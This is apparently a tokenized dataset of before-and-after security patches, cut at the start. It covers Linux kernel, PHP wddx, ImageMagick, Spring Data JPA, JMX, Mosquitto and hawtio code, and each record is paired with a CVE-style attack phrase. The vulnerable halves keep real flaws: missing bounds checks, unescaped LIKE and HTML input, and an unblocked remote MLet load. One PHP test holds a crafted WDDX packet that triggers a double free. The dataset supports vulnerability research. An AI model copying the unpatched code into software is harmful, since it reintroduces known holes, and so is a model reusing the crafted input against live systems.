")", "?", "\"", "\\\\", "\\\"", "\"", ":", "c", ")", ";", "escaped", "=", "(", "!", "escaped", "&", "&", "c", "=", "=", "'", "\\\\", "')", ";", "}", "return", "sb", ".", "toString", "(", ");", "}", "BiConsumer", "<", "String", ",", "String", ">", "tester", "=", "(", "input", ",", "output", ")", "-", ">"], "docstring_tokens": ["using", "a", "reflected", "file", "download", "(RFD", ")", "attack"]}
{"contents": ["empty"], "code_tokens": ["-", "-", "TEST", "-", "-", "Bug", "#", "72340", ":", "Double", "Free", "Courruption", "in", "wddx_deserialize", "-", "-", "SKIPIF", "-", "-", "<", "?", "php", "if", "(", "!", "extension_loaded", "(", "\"", "wddx", "\"", "))", "print", "\"", "skip", "\"", ";", "?", ">", "-", "-", "FILE", "-", "-", "<", "?", "php", "$", "xml", "=", "<", "<<", "EOF", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "?", ">", "<", "!", "DOCTYPE", "wddxPacket", "SYSTEM", "'", "wddx_0100", ".", "dtd", "'", ">", "<", "wddxPacket", "version", "=", "'", "1", ".", "0", "'", ">", "<", "array", ">", "<", "var", "name", "=", "\"", "XXXXXXXX", "\"", "><", "boolean", "value", "=", "\"", "none", "\"", ">", "TEST", "<", "/", "boolean", ">", "</", "var", ">", "<", "var", "name", "=", "\"", "YYYYYYYY", "\"", "><", "var", "name", "=", "\"", "ZZZZZZZZ", "\"", "><", "var", "name", "=", "\"", "EZEZEZEZ", "\"", ">", "<", "/", "var", ">", "</", "var", ">", "</", "var", ">", "<", "/", "array", ">", "<", "/", "wddxPacket", ">", "EOF", ";", "$", "array", "=", "wddx_deserialize", "(", "$", "xml", ")", ";", "var_dump", "(", "$", "array", ")", ";", "?", ">", "-", "-", "EXPECT", "-", "-", "array", "(", "0", ")", "{", "}", "@", "@", "-", "1096", ",", "6", "+", "1096", ",", "9", "@", "@", "static", "void", "php_wddx_process_data", "(", "void", "*", "user_data", ",", "const", "XML_Char", "*", "s", ",", "int", "len", ")", "if", "(", "!", "ent", "-", ">", "data", ")", "{", "break", ";", "}", "ent", "-", ">", "varname", "=", "NULL", ";</s>"], "docstring_tokens": ["integer", "overflows)"]}
{"contents": ["empty"], "code_tokens": ["length", "=", "(", "MagickSizeType", ")", "(", "unsigned", "char", ")", "ReadBlobByte", "(", "image", ")", ";</s>length", "=", "(", "MagickSizeType", ")", "ReadBlobByte", "(", "image", ")", ";"], "docstring_tokens": ["persuading", "a", "victim", "to", "open", "a", "specially", "crafted", "file"]}
{"contents": ["empty"], "code_tokens": ["handleInvoke", "(", "mbs", ",", "objectName", ",", "(", "String", ")", "args", "[", "1", "]", ",", "(", "Object", "[", "])", "args", "[", "2", "]", ",", "(", "String", "[", "])", "args", "[", "3", "]", ");", "void", "handleInvoke", "(", "MBeanServer", "mbs", ",", "ObjectName", "objectName", ",", "String", "operationName", ",", "Object", "[", "]", "params", ",", "String", "[", "]", "signature", ")", "throws", "IOException", ",", "InstanceNotFoundException", "{", "handleInvoke", "(", "mbs", ",", "null", ",", "objectName", ",", "operationName", ",", "params", ",", "signature", ")", ";", "void", "handleInvoke", "(", "MBeanServer", "mbs", ",", "BulkRequestContext", "context", ",", "ObjectName", "objectName", ",", "String", "operationName", ",", "Object", "[", "]", "params", ",", "String", "[", "]", "signature", ")", "throws", "IOException", ",", "InstanceNotFoundException", "{", "if", "(", "mbs", "!", "=", "null", "&", "&", "mbs", ".", "isInstanceOf", "(", "objectName", ",", "\"", "javax", ".", "management", ".", "loading", ".", "MLet", "\"", ")", "&", "&", "(", "\"", "addUrl", "\"", ".", "equals", "(", "operationName", ")", "|", "|", "\"", "getMBeansFromURL", "\"", ".", "equals", "(", "operationName", ")", "))", "{", "SecurityException", "se", "=", "new", "SecurityException", "(", "operationName", "+", "\"", "is", "not", "allowed", "to", "be", "invoked", "\"", ");", "if", "(", "logger", "!", "=", "null", ")", "{", "logger", ".", "log", "(", "INVOKE", ",", "INVOKE_SIG", ",", "null", ",", "se", ",", "objectName", ",", "operationName", ",", "signature", ",", "params", ")", ";", "}", "throw", "se", ";", "}</s>handleInvoke", "(", "objectName", ",", "(", "String", ")", "args", "[", "1", "]", ",", "(", "Object", "[", "])", "args", "[", "2", "]", ",", "(", "String", "[", "])", "args", "[", "3", "]", ");", "void", "handleInvoke", "(", "ObjectName", "objectName", ",", "String", "operationName", ",", "Object", "[", "]", "params", ",", "String", "[", "]", "signature", ")", "throws", "IOException", "{", "handleInvoke", "(", "null", ",", "objectName", ",", "operationName", ",", "params", ",", "signature", ")", ";", "void", "handleInvoke", "(", "BulkRequestContext", "context", ",", "ObjectName", "objectName", ",", "String", "operationName", ",", "Object", "[", "]", "params", ",", "String", "[", "]", "signature", ")", "throws", "IOException", "{"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["err", "=", "handle", "-", ">", "h_err", ";", "rc", "=", "jbd2_journal_stop", "(", "handle", ")", ";", "return", "err", "?", "err", ":", "rc", ";</s>err", "=", "jbd2_journal_stop", "(", "handle", ")", ";", "return", "handle", "-", ">", "h_err", "?", "handle", "-", ">", "h_err", ":", "err", ";", "err", "=", "handle", "-", ">", "h_err", ";"], "docstring_tokens": ["by", "leveraging", "improper", "access", "to", "a", "certain", "error", "field", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "res", ")", "return", "-", "EINVAL", ";</s>"], "docstring_tokens": ["by", "triggering", "a", "failure", "of", "resource", "retrieval", "."]}
{"contents": ["empty"], "code_tokens": ["import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "*", "@", "author", "Jens", "Schauder", "*", "@", "param", "escapeCharacter", "public", "static", "<", "T", ">", "Predicate", "getPredicate", "(", "Root", "<", "T", ">", "root", ",", "CriteriaBuilder", "cb", ",", "Example", "<", "T", ">", "example", ",", "EscapeCharacter", "escapeCharacter", ")", "{", "example", ".", "getProbeType", "(", "),", "new", "ExampleMatcherAccessor", "(", "matcher", ")", ",", "new", "PathNode", "(", "\"", "root", "\"", ",", "null", ",", "example", ".", "getProbe", "(", "))", ",", "escapeCharacter", ")", ";", "Class", "<", "?>", "probeType", ",", "ExampleMatcherAccessor", "exampleAccessor", ",", "PathNode", "currentNode", ",", "EscapeCharacter", "escapeCharacter", ")", "{", "predicates", ".", "addAll", "(", "getPredicates", "(", "currentPath", ",", "cb", ",", "from", ".", "get", "(", "attribute", ".", "getName", "(", "))", ",", "(", "ManagedType", "<", "?>", ")", "attribute", ".", "getType", "(", "),", "attributeValue", ",", "probeType", ",", "exampleAccessor", ",", "currentNode", ",", "escapeCharacter", ")", ");", "throw", "new", "JpaSystemException", "(", "new", "IllegalArgumentException", "(", "String", ".", "format", "(", "\"", "Unexpected", "path", "type", "for", "%", "s", ".", "Found", "%", "s", "where", "From", ".", "class", "was", "expected", ".", "\",", "currentPath", ",", "from", ")", "))", ";", "(", "ManagedType", "<", "?>", ")", "attribute", ".", "getType", "(", "),", "attributeValue", ",", "probeType", ",", "exampleAccessor", ",", "node", ",", "escapeCharacter", ")", ");", "predicates", ".", "add", "(", "cb", ".", "like", "(", "/", "/", "expression", ",", "/", "/", "\"", "%\"", "+", "escapeCharacter", ".", "escape", "(", "attributeValue", ".", "toString", "(", "))", "+", "\"", "%\"", ",", "/", "/", "escapeCharacter", ".", "getEscapeCharacter", "(", ")", "/", "/", ")", ");", "predicates", ".", "add", "(", "cb", ".", "like", "(", "//", "expression", ",", "/", "/", "escapeCharacter", ".", "escape", "(", "attributeValue", ".", "toString", "(", "))", "+", "\"", "%\"", ",", "/", "/", "escapeCharacter", ".", "getEscapeCharacter", "(", "))", "/", "/", ")", ";", "predicates", ".", "add", "(", "cb", ".", "like", "(", "/", "/", "expression", ",", "/", "/", "\"", "%\"", "+", "escapeCharacter", ".", "escape", "(", "attributeValue", ".", "toString", "(", "))", ",", "/", "/", "escapeCharacter", ".", "getEscapeCharacter", "(", "))", "/", "/", ")", ";", "repository", ".", "setEscapeCharacter", "(", "escapeCharacter", ")", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "*", "private", "EscapeCharacter", "escapeCharacter", ";", "*", "*", "*", "public", "void", "setEscapeCharacter", "(", "EscapeCharacter", "escapeCharacter", ")", "{", "this", ".", "escapeCharacter", "=", "escapeCharacter", ";", "}", "/", "*", "*", "/", "*", "/", "*", "return", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ",", "example", ".", "getProbeType", "(", "),", "(", "Sort", ")", "null", ")", ".", "getSingleResult", "(", ");", "/", "*", "return", "executeCountQuery", "(", "getCountQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ",", "example", ".", "getProbeType", "(", "))", ");", "/", "*", "return", "!", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ",", "example", ".", "getProbeType", "(", "),", "(", "Sort", ")", "null", ")", ".", "getResultList", "(", ")", "return", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ",", "example", ".", "getProbeType", "(", "),", "(", "Sort", ")", "null", ")", ".", "getResultList", "(", ");", "return", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ",", "example", ".", "getProbeType", "(", "),", "sort", ")", ".", "getResultList", "(", ");", "ExampleSpecification", "<", "S", ">", "spec", "=", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ";", "TypedQuery", "<", "S", ">", "query", "=", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ",", "escapeCharacter", ")", ",", "probeType", ",", "pageable", ")", ";", "*", "*", "*", "*", "private", "final", "EscapeCharacter", "escapeCharacter", ";", "*", "@", "param", "escapeCharacter", "public", "ExampleSpecification", "(", "Example", "<", "T", ">", "example", ",", "EscapeCharacter", "escapeCharacter", ")", "{", "Assert", ".", "notNull", "(", "escapeCharacter", ",", "\"", "EscapeCharacter", "must", "not", "be", "null", "!", "\")", ";", "this", ".", "escapeCharacter", "=", "escapeCharacter", ";", "return", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ",", "escapeCharacter", ")", ";", "import", "org", ".", "springframework", ".", "data", ".", "jpa", ".", "repository", ".", "query", ".", "EscapeCharacter", ";", "*", "@", "author", "Jens", "Schauder", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "null", ",", "cb", ",", "of", "(", "new", "Person", "(", "))", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "null", ",", "of", "(", "new", "Person", "(", "))", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "null", ",", "null", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "new", "Person", "(", "))", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ",", "equalTo", "(", "truePredicate", ")", ");", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "p", ")", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ",", "equalTo", "(", "dummyPredicate", ")", ");", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "p", ")", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "p", ")", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ",", "equalTo", "(", "andPredicate", ")", ");", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ",", "equalTo", "(", "orPredicate", ")", ");", "@", "Test", "/", "/", "DATAJPA", "-", "1534", "public", "void", "likePatternsGetEscapedContaining", "(", ")", "{", "Person", "person", "=", "new", "Person", "(", ");", "person", ".", "firstname", "=", "\"", "f", "\\", "\\", "o_o", "\"", ";", "Example", "<", "Person", ">", "example", "=", "of", "(", "/", "/", "person", ",", "/", "/", "ExampleMatcher", "/", "/", ".", "matchingAny", "(", ")", "/", "/", ".", "withStringMatcher", "(", "ExampleMatcher", ".", "StringMatcher", ".", "CONTAINING", ")", "/", "/", ")", ";", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "verify", "(", "cb", ",", "times", "(", "1", ")", ").", "like", "(", "any", "(", "Expression", ".", "class", ")", ",", "eq", "(", "\"%", "f", "\\", "\\\\", "\\", "o", "\\", "\\", "_o", "%", "\")", ",", "eq", "(", "'\\", "\\'", "))", ";", "}", "@", "Test", "/", "/", "DATAJPA", "-", "1534", "public", "void", "likePatternsGetEscapedStarting", "(", ")", "{", "Person", "person", "=", "new", "Person", "(", ");", "person", ".", "firstname", "=", "\"", "f", "\\", "\\", "o_o", "\"", ";", "Example", "<", "Person", ">", "example", "=", "of", "(", "/", "/", "person", ",", "/", "/", "ExampleMatcher", "/", "/", ".", "matchingAny", "(", ")", "/", "/", ".", "withStringMatcher", "(", "ExampleMatcher", ".", "StringMatcher", ".", "STARTING", ")", "/", "/", ")", ";", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "verify", "(", "cb", ",", "times", "(", "1", ")", ").", "like", "(", "any", "(", "Expression", ".", "class", ")", ",", "eq", "(", "\"", "f", "\\", "\\\\", "\\", "o", "\\", "\\", "_o", "%", "\")", ",", "eq", "(", "'\\", "\\'", "))", ";", "}", "@", "Test", "/", "/", "DATAJPA", "-", "1534", "public", "void", "likePatternsGetEscapedEnding", "(", ")", "{", "Person", "person", "=", "new", "Person", "(", ");", "person", ".", "firstname", "=", "\"", "f", "\\", "\\", "o_o", "\"", ";", "Example", "<", "Person", ">", "example", "=", "of", "(", "/", "/", "person", ",", "/", "/", "ExampleMatcher", "/", "/", ".", "matchingAny", "(", ")", "/", "/", ".", "withStringMatcher", "(", "ExampleMatcher", ".", "StringMatcher", ".", "ENDING", ")", "/", "/", ")", ";", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ",", "EscapeCharacter", ".", "of", "(", "'\\", "\\'", "))", ";", "verify", "(", "cb", ",", "times", "(", "1", ")", ").", "like", "(", "any", "(", "Expression", ".", "class", ")", ",", "eq", "(", "\"%", "f", "\\", "\\\\", "\\", "o", "\\", "\\", "_o", "\"", "),", "eq", "(", "'\\", "\\'", "))", ";", "}</s>import", "java", ".", "util", ".", "EnumSet", ";", "public", "static", "<", "T", ">", "Predicate", "getPredicate", "(", "Root", "<", "T", ">", "root", ",", "CriteriaBuilder", "cb", ",", "Example", "<", "T", ">", "example", ")", "{", "example", ".", "getProbeType", "(", "),", "new", "ExampleMatcherAccessor", "(", "matcher", ")", ",", "new", "PathNode", "(", "\"", "root", "\"", ",", "null", ",", "example", ".", "getProbe", "(", "))", ");", "Class", "<", "?>", "probeType", ",", "ExampleMatcherAccessor", "exampleAccessor", ",", "PathNode", "currentNode", ")", "{", "predicates", ".", "addAll", "(", "getPredicates", "(", "currentPath", ",", "cb", ",", "from", ".", "get", "(", "attribute", ".", "getName", "(", "))", ",", "(", "ManagedType", "<", "?>", ")", "attribute", ".", "getType", "(", "),", "attributeValue", ",", "probeType", ",", "exampleAccessor", ",", "currentNode", ")", ");", "throw", "new", "JpaSystemException", "(", "new", "IllegalArgumentException", "(", "String", ".", "format", "(", "\"", "Unexpected", "path", "type", "for", "%", "s", ".", "Found", "%", "s", "where", "From", ".", "class", "was", "expected", ".", "\",", "currentPath", ",", "from", ")", "))", ";", "(", "ManagedType", "<", "?>", ")", "attribute", ".", "getType", "(", "),", "attributeValue", ",", "probeType", ",", "exampleAccessor", ",", "node", ")", ");", "predicates", ".", "add", "(", "cb", ".", "like", "(", "expression", ",", "\"", "%\"", "+", "attributeValue", "+", "\"", "%\"", "))", ";", "predicates", ".", "add", "(", "cb", ".", "like", "(", "expression", ",", "attributeValue", "+", "\"", "%\"", "))", ";", "predicates", ".", "add", "(", "cb", ".", "like", "(", "expression", ",", "\"", "%\"", "+", "attributeValue", ")", ");", "*", "*", "*", "*", "/", "*", "*", "/", "*", "/", "*", "return", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ",", "example", ".", "getProbeType", "(", "),", "(", "Sort", ")", "null", ")", ".", "getSingleResult", "(", ");", "/", "*", "return", "executeCountQuery", "(", "getCountQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ",", "example", ".", "getProbeType", "(", "))", ");", "/", "*", "return", "!", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ",", "example", ".", "getProbeType", "(", "),", "(", "Sort", ")", "null", ")", ".", "getResultList", "(", ")", "return", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ",", "example", ".", "getProbeType", "(", "),", "(", "Sort", ")", "null", ")", ".", "getResultList", "(", ");", "return", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ",", "example", ".", "getProbeType", "(", "),", "sort", ")", ".", "getResultList", "(", ");", "ExampleSpecification", "<", "S", ">", "spec", "=", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ";", "TypedQuery", "<", "S", ">", "query", "=", "getQuery", "(", "new", "ExampleSpecification", "<", "S", ">", "(", "example", ")", ",", "probeType", ",", "pageable", ")", ";", "*", "*", "*", "*", "public", "ExampleSpecification", "(", "Example", "<", "T", ">", "example", ")", "{", "return", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ")", ";", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "null", ",", "cb", ",", "of", "(", "new", "Person", "(", "))", ");", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "null", ",", "of", "(", "new", "Person", "(", "))", ");", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "null", ",", "null", ")", ";", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "new", "Person", "(", "))", "),", "equalTo", "(", "truePredicate", ")", ");", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "p", ")", "),", "equalTo", "(", "dummyPredicate", ")", ");", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "p", ")", ");", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "of", "(", "p", ")", "),", "equalTo", "(", "andPredicate", ")", ");", "assertThat", "(", "QueryByExamplePredicateBuilder", ".", "getPredicate", "(", "root", ",", "cb", ",", "example", ")", ",", "equalTo", "(", "orPredicate", ")", ");"], "docstring_tokens": ["sending", "a", "specially-crafted", "request"]}
{"contents": ["empty"], "code_tokens": ["cgc", ".", "cmd", "[", "9", "]", "=", "cgc", ".", "buflen", "&", "0xff", ";</s>cgc", ".", "cmd", "[", "9", "]", "=", "cgc", ".", "buflen", "=", "0xff", ";"], "docstring_tokens": ["creating", "a", "malicious", "USB", "storage", "device", "that", "assigns", "an", "incorrect", "length", "variable"]}
{"contents": ["empty"], "code_tokens": ["int", "count", ",", "int", "pmgr_flag", ")", ";", "int", "count", ",", "int", "pmgr_flag", ")", "/", "*", "Invalid", "patch", "format", "*", "/", "/", "*", "Patch", "header", "too", "short", "*", "/", "*", "Copy", "the", "header", "from", "user", "space", "if", "(", "copy_from_user", "(", "&", "sysex", ",", "addr", ",", "hdr_size", ")", ")", "/", "*", "Sysex", "record", "too", "short", "*", "/", "if", "(", "(", "unsigned", ")", "count", "<", "(", "unsigned", ")", "sysex", ".", "len", ")", "left", "=", "sysex", ".", "len", ";", "src_offs", "=", "0", ";", "int", "count", ",", "int", "pmgr_flag", ")", ";", "int", "count", ",", "int", "pmgr_flag", ")", "if", "(", "copy_from_user", "(", "&", "ins", ",", "addr", ",", "sizeof", "(", "ins", ")", "))", "err", "=", "synth_devs", "[", "dev", "]", "->", "load_patch", "(", "dev", ",", "fmt", ",", "buf", "+", "p", ",", "c", ",", "0", ")", ";</s>int", "offs", ",", "int", "count", ",", "int", "pmgr_flag", ")", ";", "int", "offs", ",", "int", "count", ",", "int", "pmgr_flag", ")", "{", "/", "*", "printk", "(", "\"", "MIDI", "Error", ":", "Invalid", "patch", "format", "(", "key", ")", "0x", "%", "x", "\\", "n", "\"", ",", "format", ")", ";*", "/", "}", "{", "/", "*", "printk", "(", "\"", "MIDI", "Error", ":", "Patch", "header", "too", "short", "\\", "n", "\"", ");", "*/", "}", "*", "Copy", "the", "header", "from", "user", "space", "but", "ignore", "the", "first", "bytes", "which", "have", "*", "been", "transferred", "already", ".", "if", "(", "copy_from_user", "(", "&(", "(", "char", "*", ")", "&", "sysex", ")", "[", "offs", "]", ",", "&", "(", "addr", ")", "[", "offs", "]", ",", "hdr_size", "-", "offs", ")", ")", "if", "(", "count", "<", "sysex", ".", "len", ")", "{", "/", "*", "printk", "(", "KERN_WARNING", "\"", "MIDI", "Warning", ":", "Sysex", "record", "too", "short", "(", "%", "d", "<", "%", "d", ")", "\\", "n", "\"", ",", "count", ",", "(", "int", ")", "sysex", ".", "len", ")", ";*", "/", "}", "left", "=", "sysex", ".", "len", ";", "src_offs", "=", "0", ";", "int", "offs", ",", "int", "count", ",", "int", "pmgr_flag", ")", ";", "int", "offs", ",", "int", "count", ",", "int", "pmgr_flag", ")", "/", "*", "*", "What", "the", "fuck", "is", "going", "on", "here", "?", "We", "leave", "junk", "in", "the", "beginning", "*", "of", "ins", "and", "then", "check", "the", "field", "pretty", "close", "to", "that", "beginning", "?", "*", "/", "if", "(", "copy_from_user", "(", "&(", "(", "char", "*", ")", "&", "ins", ")", "[", "offs", "]", ",", "addr", "+", "offs", ",", "sizeof", "(", "ins", ")", "-", "offs", ")", ")", "err", "=", "synth_devs", "[", "dev", "]", "->", "load_patch", "(", "dev", ",", "fmt", ",", "buf", ",", "p", "+", "4", ",", "c", ",", "0", ")", ";"], "docstring_tokens": ["sending", "a", "specially-crafted", "request", "to", "/dev/sequencer"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "!", "IS_ERR", "(", "req", ")", ")", "fuse_put_request", "(", "fc", ",", "req", ")", ";</s>fuse_put_request", "(", "fc", ",", "req", ")", ";"], "docstring_tokens": ["via", "vectors", "possibly", "related", "to", "a", "memory-consumption", "attack", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "shader_rec_offset", "<", "args", "-", ">", "bin_cl_size", "|", "|", "uniforms_offset", "<", "shader_rec_offset", "|", "|</s>if", "(", "uniforms_offset", "<", "shader_rec_offset", "|", "|"], "docstring_tokens": ["using", "a", "malformed", "VC4_SUBMIT_CL", "ioctl", "call", "with", "crafted", "size", "value"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "i", "=", "=", "len", "-", "codelen", "+", "1", ")", "{", "/", "*", "Not", "enough", "data", "*", "/", "return", "MOSQ_ERR_MALFORMED_UTF8", ";", "}", "/", "*", "Check", "for", "overlong", "or", "out", "of", "range", "encodings", "*", "/", "}", "else", "if", "(", "codelen", "=", "=", "4", "&", "&", "(", "codepoint", "<", "0x10000", "|", "|", "codepoint", ">", "0x10FFFF", ")", "){", "/", "*", "This", "used", "to", "be", "valid", "in", "pre", "-", "2003", "utf", "-", "8", "*", "/", "assert_invalid", "(", "\"", "2", ".", "3", ".", "5", "U", "-", "00110000", "=", "f4", "90", "80", "80", "=", "\\", "\"\ufffd", "\ufffd\ufffd", "\ufffd\\", "\"\"", ");", "/", "*", "This", "used", "to", "be", "valid", "in", "pre", "-", "2003", "utf", "-", "8", "*", "/", "assert_invalid", "(", "\"", "2", ".", "3", ".", "5", "U", "-", "00110000", "=", "f4", "90", "80", "80", "=", "\\", "\"\ufffd", "\ufffd\ufffd", "\ufffd\\", "\"\"", ");</s>if", "(", "i", "=", "=", "len", "-", "1", ")", "{", "/", "*", "Not", "enough", "data", "*", "/", "return", "MOSQ_ERR_MALFORMED_UTF8", ";", "}", "/", "*", "Check", "for", "overlong", "encodings", "*", "/", "}", "else", "if", "(", "codelen", "=", "=", "4", "&", "&", "codepoint", "<", "0x10000", ")", "{", "assert_valid", "(", "\"", "2", ".", "3", ".", "5", "U", "-", "00110000", "=", "f4", "90", "80", "80", "=", "\\", "\"\ufffd", "\ufffd\ufffd", "\ufffd\\", "\"\"", ");", "assert_valid", "(", "\"", "2", ".", "3", ".", "5", "U", "-", "00110000", "=", "f4", "90", "80", "80", "=", "\\", "\"\ufffd", "\ufffd\ufffd", "\ufffd\\", "\"\"", ");"], "docstring_tokens": ["sending", "a", "specially-crafted", "string"]}
{"contents": ["empty"], "code_tokens": ["#", "include", "<", "linux", "/", "nospec", ".", "h", ">", "ac", "-", ">", "ac_2order", "=", "array_index_nospec", "(", "i", "-", "1", ",", "sb", "-", ">", "s_blocksize_bits", "+", "2", ")", ";</s>ac", "-", ">", "ac_2order", "=", "i", "-", "1", ";"], "docstring_tokens": ["via", "a", "speculative", "buffer", "overflow", "and", "side-channel", "analysis", "."]}
{"contents": ["empty"], "code_tokens": ["import", "com", ".", "google", ".", "gwt", ".", "safehtml", ".", "shared", ".", "SafeHtmlUtils", ";", "view", ".", "getTaskIdAndName", "(", ").", "setText", "(", "SafeHtmlUtils", ".", "htmlEscape", "(", "String", ".", "valueOf", "(", "selectedTaskId", ")", "+", "\"", "-", "\"", "+", "selectedTaskName", ")", ");</s>view", ".", "getTaskIdAndName", "(", ").", "setText", "(", "String", ".", "valueOf", "(", "selectedTaskId", ")", "+", "\"", "-", "\"", "+", "selectedTaskName", ")", ";"], "docstring_tokens": ["via", "vectors", "related", "to", "task", "name", "html", "inputs", "."]}
{"contents": ["empty"], "code_tokens": ["if", "(", "(", "inode", "-", ">", "i_mode", "&", "(", "S_ISGID", "|", "S_IXGRP", ")", ")", "=", "=", "S_ISGID", "&", "&", "fl", "-", ">", "fl_type", "!", "=", "F_UNLCK", ")</s>if", "(", "(", "inode", "-", ">", "i_mode", "&", "(", "S_ISGID", "|", "S_IXGRP", ")", ")", "=", "=", "S_ISGID", ")"], "docstring_tokens": ["locking", "a", "file", "on", "an", "NFS", "filesystem", "and", "modifying", "it's", "permissions"]}
{"contents": ["empty"], "code_tokens": ["</s><", "env", "-", "entry", ">", "<", "description", ">", "Enable", "/", "disable", "hawtio", "'", "s", "authentication", "filter", ",", "value", "is", "really", "a", "boolean", "<", "/", "description", ">", "<", "env", "-", "entry", "-", "name", ">", "hawtio", "/", "authenticationEnabled", "<", "/", "env", "-", "entry", "-", "name", ">", "<", "env", "-", "entry", "-", "type", ">", "java", ".", "lang", ".", "String", "<", "/", "env", "-", "entry", "-", "type", ">", "<", "env", "-", "entry", "-", "value", ">", "false", "<", "/", "env", "-", "entry", "-", "value", ">", "<", "/", "env", "-", "entry", ">", "<", "env", "-", "entry", ">", "<", "description", ">", "Authorized", "user", "role", ",", "empty", "string", "disables", "authorization", "<", "/", "description", ">", "<", "env", "-", "entry", "-", "name", ">", "hawtio", "/", "role", "<", "/", "env", "-", "entry", "-", "name", ">", "<", "env", "-", "entry", "-", "type", ">", "java", ".", "lang", ".", "String", "<", "/", "env", "-", "entry", "-", "type", ">", "<", "env", "-", "entry", "-", "value", ">", "</", "env", "-", "entry", "-", "value", ">", "<", "/", "env", "-", "entry", ">", "<", "env", "-", "entry", ">", "<", "description", ">", "JAAS", "classname", "that", "would", "contain", "the", "role", "principal", ",", "empty", "string", "disables", "authorization", "<", "/", "description", ">", "<", "env", "-", "entry", "-", "name", ">", "hawtio", "/", "rolePrincipalClasses", "<", "/", "env", "-", "entry", "-", "name", ">", "<", "env", "-", "entry", "-", "type", ">", "java", ".", "lang", ".", "String", "<", "/", "env", "-", "entry", "-", "type", ">", "<", "env", "-", "entry", "-", "value", ">", "</", "env", "-", "entry", "-", "value", ">", "<", "/", "env", "-", "entry", ">", "<", "env", "-", "entry", ">", "<", "description", ">", "JAAS", "realm", "used", "to", "authenticate", "users", "<", "/", "description", ">", "<", "env", "-", "entry", "-", "name", ">", "hawtio", "/", "realm", "<", "/", "env", "-", "entry", "-", "name", ">", "<", "env", "-", "entry", "-", "type", ">", "java", ".", "lang", ".", "String", "<", "/", "env", "-", "entry", "-", "type", ">", "<", "env", "-", "entry", "-", "value", ">", "*<", "/", "env", "-", "entry", "-", "value", ">", "<", "/", "env", "-", "entry", ">"], "docstring_tokens": ["sending", "a", "specially-crafted", "request", "with", "k", "parameter"]}
{"contents": ["empty"], "code_tokens": ["if", "(", "trans", "=", "=", "NULL", ")", "{", "kmem_cache_free", "(", "rds_conn_slab", ",", "conn", ")", ";", "conn", "=", "ERR_PTR", "(", "-", "ENODEV", ")", ";", "goto", "out", ";", "}</s>"], "docstring_tokens": ["by", "using", "a", "socket", "that", "was", "not", "properly", "bound", "."]}
